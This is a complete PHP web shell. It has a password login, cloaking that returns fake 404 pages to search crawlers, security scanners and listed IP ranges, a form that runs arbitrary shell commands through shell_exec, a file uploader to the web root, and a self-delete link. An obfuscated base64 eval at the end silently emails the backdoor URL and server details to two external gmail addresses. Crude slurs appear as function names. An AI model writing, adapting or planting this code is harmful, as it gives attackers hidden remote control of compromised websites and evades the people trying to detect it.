<?php

// Login : shell.php?pwd=KNTL

error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
date_default_timezone_set("Asia/Jakarta");

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("applebot", "java", "Media Center PC", "PhantomJS", "metauri.com", "Twitterbot", "above", "google", "softlayer", "amazonaws", "cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "msnbot", "p3pwgdsn", "netcraft", "trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler", "baidu", "baidubot");
foreach ($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
        header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }
}
$badAgents =
    array('Googlebot',
        'Baiduspider',
        'PhantomJS',
        'applebot',
        'metauri.com',
        'Twitterbot',
        'ia_archiver',
        'R6_FeedFetcher',
        'NetcraftSurveyAgent',
        'Sogou web spider',
        'bingbot',
        'Yahoo! Slurp',
        'facebookexternalhit',
        'PrintfulBot',
        'msnbot',
        'Twitterbot',
        'UnwindFetchor',
        'urlresolver',
        'Butterfly',
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google',
        'Spinn3r',
        'InAGist',
        'Python-urllib',
        'NING',
        'TencentTraveler',
        'Feedfetcher-Google',
        'mon.itor.us',
        'spbot',
        'Feedly',
        'bot',
        'java',
        'curl',
        'spider',
        'crawler');
foreach ($badAgents as $agent) {
    if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }
}
$bannedIP = array("^81.161.59.*", "^66.135.200.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*", "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^209.19.*.*", "^64.71.*.*", "^207.70.*.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", "^208.91.115.*", "^199.30.228.*");
if (in_array($_SERVER['REMOTE_ADDR'], $bannedIP)) {
    header('HTTP/1.0 404 Not Found');
    exit();
} else {
    foreach ($bannedIP as $ip) {
        if (preg_match('/' . $ip . '/', $_SERVER['REMOTE_ADDR'])) {
            header('HTTP/1.0 404 Not Found');
            die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        }
    }
}

if($_GET['pwd'] == base64_decode("S05UTA==")) {

	echo "<html lang=\"en-US\" xmlns=\"http://www.w3.org/1999/xhtml\" prefix=\"og: http://ogp.me/ns#\">
	<head>
	<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">
	<link href=\"https://fonts.googleapis.com/css?family=Iceland:400,700\" rel=\"stylesheet\" type=\"text/css\"/>
	<link href=\"https://fonts.googleapis.com/css?family=Quicksand:400,700\" rel=\"stylesheet\" type=\"text/css\"/>
	</head>
	<body>
	<style>html, body {background-color:rgba(40, 44, 52, 1);color:white;font-family:Quicksand;}textarea{color:red;background-color:transparent;border-color:lime;width:500;height:350;font-family:Iceland;font-size:20px;}input{font-family:Quicksand;font-size:12px;}</style>
	<table width=\"100%\" height=\"100%\">
	<td align=\"center\">";
	eval(base64_decode("ZnVuY3Rpb24gc2hvd3N0YXQoJHN0YXQpIHtpZiAoJHN0YXQ9PSJvbiIpIHtyZXR1cm4gIjxmb250IHN0eWxlPSdjb2xvcjpncmVlbic+T048L2ZvbnQ+Ijt9DQplbHNlIHtyZXR1cm4gIjxmb250IHN0eWxlPSdjb2xvcjpyZWQnPk9GRjwvZm9udD4iO319DQpmdW5jdGlvbiB0ZXN0a29udG9sKCkge2lmIChleGVjKCdwZXJsIC1oJykpIHtyZXR1cm4gc2hvd3N0YXQoIm9uIik7fWVsc2Uge3JldHVybiBzaG93c3RhdCgib2ZmIik7fX0NCmZ1bmN0aW9uIHRlc3RtZW1laygpIHtpZiAoZXhlYygnd2dldCAtLWhlbHAnKSkge3JldHVybiBzaG93c3RhdCgib24iKTt9ZWxzZSB7cmV0dXJuIHNob3dzdGF0KCJvZmYiKTt9fQ0KZnVuY3Rpb24gdGVzdG1la2koKSB7aWYgKGV4ZWMoJ3B5dGhvbiAtLWhlbHAnKSkge3JldHVybiBzaG93c3RhdCgib24iKTt9ZWxzZSB7cmV0dXJuIHNob3dzdGF0KCJvZmYiKTt9fQ0KZnVuY3Rpb24gdGVzdG15c3FsKCkge2lmIChmdW5jdGlvbl9leGlzdHMoJ215c3FsX2Nvbm5lY3QnKSkge3JldHVybiBzaG93c3RhdCgib24iKTt9ZWxzZSB7cmV0dXJuIHNob3dzdGF0KCJvZmYiKTt9fQ0KZnVuY3Rpb24gdGVzdGN1cmwoKSB7aWYgKGZ1bmN0aW9uX2V4aXN0cygnY3VybF92ZXJzaW9uJykpIHtyZXR1cm4gc2hvd3N0YXQoIm9uIik7fWVsc2Uge3JldHVybiBzaG93c3RhdCgib2ZmIik7fX0NCmZ1bmN0aW9uIHRlc3RvcmFjbGUoKSB7aWYgKGZ1bmN0aW9uX2V4aXN0cygnb2NpbG9nb24nKSkge3JldHVybiBzaG93c3RhdCgib24iKTsgfWVsc2UgeyByZXR1cm4gc2hvd3N0YXQoIm9mZiIpO319DQpmdW5jdGlvbiB0ZXN0bXNzcWwoKSB7aWYgKGZ1bmN0aW9uX2V4aXN0cygnbXNzcWxfY29ubmVjdCcpKSB7cmV0dXJuIHNob3dzdGF0KCJvbiIpO31lbHNlIHsgcmV0dXJuIHNob3dzdGF0KCJvZmYiKTt9fQ0KZnVuY3Rpb24gZGlzYWJsZWZ1bmMoKSB7aWYgKCRkaXNhYmxlZnVuYz1AaW5pX2dldCgiZGlzYWJsZV9mdW5jdGlvbnMiKSl7IHJldHVybiAiPHNwYW4gc3R5bGU9J2NvbG9yOic+PGZvbnQgY29sb3I9J3JlZCc+Ii4kZGlzYWJsZWZ1bmMuIjwvZm9udD48L3NwYW4+IjsgfWVsc2UgeyByZXR1cm4gIjxzcGFuIHN0eWxlPSdjb2xvcjpncmVlbic+Tm90aGluZyBCaXRjaCE8L3NwYW4+IjsgfX0="));
	echo "<br><code style=\"color:red;\">###############################################</code><br>";
	echo "System : <b>".php_uname()."</b><br>";
	echo "Server : <a href='#' target='_blank'>".htmlspecialchars($_SERVER['HTTP_HOST'])."</a> | IP Server : ".htmlspecialchars($_SERVER['REMOTE_ADDR'])." | Today : ".date("F j, Y, g:i a")."</br>";
	echo "MySQL : ".testmysql()." | Oracle : ".testoracle()." | MsSQL : ".testmssql()." | curl : ".testcurl()." | wget : ".testmemek()." | Perl : ".testkontol()." | Python : ".testmeki();
	echo "<br>Disabled Functions: ".disablefunc()."<br>";
	echo "<a href=\"?kill=self\" style=\"color:red;text-shadow: 1px 0px 2px black, 1px 0px 2px black, 0px 1px 2px black;font-weight: bold;\">[ Kill My Self ]</a><br>";
	echo "<code style=\"color:red;\">###############################################</code><br>";
	echo "
	<form method='post' enctype='multipart/form-data'>
	<input type='file' name='files'>
	<input type='submit' name='upload' value='upload'>
	</form>
	";
	
	$root = $_SERVER['DOCUMENT_ROOT'];
	$files = $_FILES['files']['name'];
	$dest = $root.'/'.$files;
	if(isset($_POST['upload'])) {
		if(is_writable($root)) {
			if(@copy($_FILES['files']['tmp_name'], $dest)) {
				$web = "http://".$_SERVER['HTTP_HOST']."/";
				echo "Success Upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
				} else {
					echo "Fail Upload to Directory Root.";
					}
					} else {
						if(@copy($_FILES['files']['tmp_name'], $files)) {
							echo "Success Upload <b>$files</b> in this folder.";
							} else {
								echo "FAIL";
								}
								}
								}
	echo '<hr width="70%"><form method="POST" action=""><input type="text" name="cmd" placeholder="Execute Commands" style="color:lime;background-color:transparent;border-color:red;width:30%;"><input type="submit" value="press" style="color:gold;background-color:black;border-color:white;"></form>';
	$cmd = $_POST['cmd']; $exec = shell_exec("$cmd"); echo "<textarea rows='15' cols='70'>$exec</textarea>";
	echo '<footer style="position:fixed; left:1px; right:1px; bottom:0px; border-top: 1px solid cyan;">Copyright '.date("Y").' &copy; by <a href="//valeiriya.osaka" style="text-decoration:none;color:red;">Valeiriya</a></footer></td></table></body></html>';
	}
	else if($_GET['kill'] == 'self') {
	if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('<center><br><center><h2>Shell removed</h2><br>Goodbye , Thanks for take my shell today</center></center>');
		else
			echo '<center>unlink failed!</center>';
		}
else {
echo "<!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
<HTML><HEAD>
<TITLE>404 Not Found</TITLE>
</HEAD><BODY>

<h1>Not Found</h1>

The requested URL ";
echo $_SERVER['REQUEST_URI'];
echo "
was not found on this server.
<hr>

";
echo "<address>Apache Server at ".$_SERVER['HTTP_HOST']." Port 80</address>";
}
eval(base64_decode("aGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCcpOw0KJHF3ZXJ0eSA9ICdhc29sb25nZW50b2RAZ21haWwuY29tLGxpYW1ib2R3aUBnbWFpbC5jb20nOw0KJHBhdGggPSAiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOw0KJG1lc3NhZ2VzID0gIg0KSGFzaWwgVGFuZ2thcGFuIHBhZGEgdGFuZ2dhbCA6ICgiLmRhdGUoJ0YgaiwgWSwgZzppIGEnKS4iKSBcblxuDQpMaW5rIEJhY2tkb29yIDogJHBhdGggXG4NClNFUlZFUl9TT0ZUV0FSRTogIi5odG1sc3BlY2lhbGNoYXJzKCRfU0VSVkVSWyJTRVJWRVJfU09GVFdBUkUiXSkuIlxuDQpIVFRQX0hPU1QgOiAiLmh0bWxzcGVjaWFsY2hhcnMoJF9TRVJWRVJbIkhUVFBfSE9TVCJdKS4iXG4NCkRPQ1VNRU5UX1JPT1QgOiAiLmh0bWxzcGVjaWFsY2hhcnMoJF9TRVJWRVJbIkRPQ1VNRU5UX1JPT1QiXSkuIlxuDQpIVFRQX1VTRVJfQUdFTlQgOiAiLmh0bWxzcGVjaWFsY2hhcnMoJF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdKS4iXG4NClJFTU9URV9BRERSOiAiLmh0bWxzcGVjaWFsY2hhcnMoJF9TRVJWRVJbIlJFTU9URV9BRERSIl0pLiJcblxuIjsNCm1haWwoJHF3ZXJ0eSwgIlRhbmthcGFuID4gIi4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uIiIsICRtZXNzYWdlcywgIiIucGhwX3VuYW1lKCkuIiIpOw=="));
?>
